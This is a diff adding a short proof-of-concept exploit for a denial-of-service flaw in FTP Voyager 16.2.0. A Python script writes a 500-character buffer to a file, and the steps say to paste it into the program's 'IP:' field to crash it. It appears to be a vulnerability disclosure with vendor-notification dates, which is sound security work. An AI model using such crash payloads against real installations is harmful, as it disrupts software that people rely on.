@@ -1,0 +1,25 @@
+# Exploit Title: FTP Voyager 16.2.0 - Denial of Service (PoC)
+# Author: Abdullah Alıç
+# Discovey Date: 2018-10-2
+# Vendor notified : 2018-10-2
+# Homepage: https://www.serv-u.com/
+# Software Link: https://www.serv-u.com/ftp-voyager
+# Tested Version: 16.2.0
+# Tested on OS: Windows XP Professional sp3 (ENG)
+# Steps to Reproduce: Run the python exploit script, it will create a new file
+# with the name "boom.txt". Copy the content of the new file "boom.txt". 
+# Start FTP Voyager click "site profiles" >>  New site >> Paste the content into field "IP:" field and hit enter! 
+  
+#!/usr/bin/python
+   
+buffer = "A" * 500
+
+payload = buffer
+try:
+    f=open("boom.txt","w")
+    print "[+] Creating %s bytes evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
